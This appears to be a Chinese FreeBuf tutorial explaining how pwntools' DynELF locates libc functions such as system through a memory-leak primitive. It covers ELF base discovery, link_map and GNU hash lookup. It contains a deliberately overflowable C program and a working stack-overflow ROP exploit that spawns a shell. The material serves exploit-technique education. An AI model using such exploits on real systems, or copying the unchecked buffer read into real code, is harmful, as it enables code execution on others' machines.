@@ -1,0 +1,122 @@
+***本文作者：xmwanth，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
+**DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄漏函数的情况下，可以解析任意加载库的任意符号地址。本文将对其技术原理进行介绍，其中涉及ELF文件中的hash表、动态符号表、字符串表、Dynamic段，以及link_map结构等内容。**
+
+## 一、DynELF应用示例
+
+目标程序源代码：
+
+    
+    
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    
+    void vulfun(){
+        char buf[128];
+        read(STDIN_FILENO, buf, 256);
+    }
+    
+    int main(int argc, char** argv){
+        vulfun();
+        write(STDOUT_FILENO, "Hello,World\n", 13);
+    }
+
+poc:
+
+    
+    
+    #!/usr/bin/env python
+    from pwn import *
+    
+    elf  = ELF('vul_elf')
+    plt_write = elf.symbols['write']
+    plt_read = elf.symbols['read']
+    vulfun_addr = 0x08048404
+    
+    def leak(address):
+    	payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)
+    	p.send(payload1)
+    	data = p.recv(4)
+    	return data
+    
+    p = process('./vul_elf')
+    d=DynELF(leak, ptr)
+    system_addr = d.lookup('system', 'libc')
+    
+    bss_addr = 0x0804a018
+    pppr = 0x080484bd
+    payload2 = 'a'*140 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
+    p.send(payload2)
+    p.send("/bin/sh\0")
+    p.interactive()
+
+## 二、DynELF原理
+
+在示例中，应用DynELF的代码是：
+
+    
+    
+    d=DynELF(leak, ptr)
+    
+    system_addr = d.lookup('system', 'libc')
+
+可以看到，DynELF作用是寻找system函数在内存中的加载地址，下面对该过程进行介绍：
+
+### 1、获取vul_elf内存加载基地址
+
+已知vul_elf加载内存范围内的一个地址ptr，将该地址进行页对齐
+
+    
+    
+    page_size = 0x1000
+    
+    page_mask = ~(page_size - 1)
+    
+    ptr &= page_mask
+
+然后对比内存页起始字符串是否为'\x7fELF'，如果不是，一直向低地址内存页(ptr -=
+page_size)进行查找，找到符合该条件的页面，该页面起始地址就是vul_elf文件内存加载基地址。
+
+寻找vul_elf内存加载基地址的示意图如下：
+
+![](https://image.3001.net/images/20190104/1546617209_5c2f8179910b8.png!small)
+
+### 2、获取libc.so内存加载基地址
+
+vul_elf是动态链接的可执行文件，在该类型文件中有一个link_map双向链表，其中包含了每个动态加载的库的路径和加载基址等信息，其数据结构为：
+
+可以通过两种途径获取link_map链表：一是在所有ELF文件中，通过Dynamic段DT_DEBUG区域得到。二是在non-RELRO
+ELF文件中，link_map地址存在于.got.plt区节中，该区节的加载地址可以从DYNAMIC段DT_PLTGOT区域得到。
+
+这两种途径都需要知道vul_elf的DYNAMIC段地址：我们在第一步中获取了vul_el内存加载基地址，由此可以得到vul_elf段表，通过解析vul_elf段表可以得到DYNAMIC基地址。
+
+通过第二种方式获取link_map结构的示意图如下：
+
+![](https://image.3001.net/images/20190104/1546617454_5c2f826e3dc0f.png!small)
+
+### 3、获取libc.so的hash表、动态符号表、字符串表基地址
+
+在所有需要导出函数给其他文件使用的ELF文件（例如:
+“libc.so”）中，用动态符号表、字符串表、hash表等一系列表用于指示导出符号（例如:”system”）的名称、地址、hash值等信息。通过libc.so的Dynamic段DT_GNU_HASH、DT_SYMTAB、DT_STRTAB可以获取hash表、动态符号表、字符串表在内存中的基地址。
+
+### 4、通过hash表获取system函数地址
+
+hash表是用于查找符号的散列表，通过libc.so的hash表可以找到system函数内存加载地址，在ELF文件中有SYSV、GNU两种类型的hash表，其中通过GNU
+HASH查找system函数地址示意图如下。其寻找过程涉及诸多细节，在此不多叙述，后面会写文章对通过hash表找到符号地址作专门讲解。
+
+![](https://image.3001.net/images/20190104/1546617510_5c2f82a68386e.png!small)
+
+图中： nbuckets是hash buckets的数值，symndx是hash表映射符号表的起始索引，Bloom
+Filter用作过滤不在符号表中的符号名称，在DynELF中并没有使用：
+
+    
+    
+    hash=gnu_hash(“system”)，gnu_hash是GNU HASH算法函数
+    
+    ndx=hash%nbuckets，ndx是符号表中所有 符号HASH%nubuckets 相等的起始索引
+
+最后：内存泄露函数在过程中用作读取程序内存数据，像上面例子中获取link_map、DYNAMIC段、vul_elf段表等内容都是通过内存泄露函数。
+
+ ***本文作者：xmwanth，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
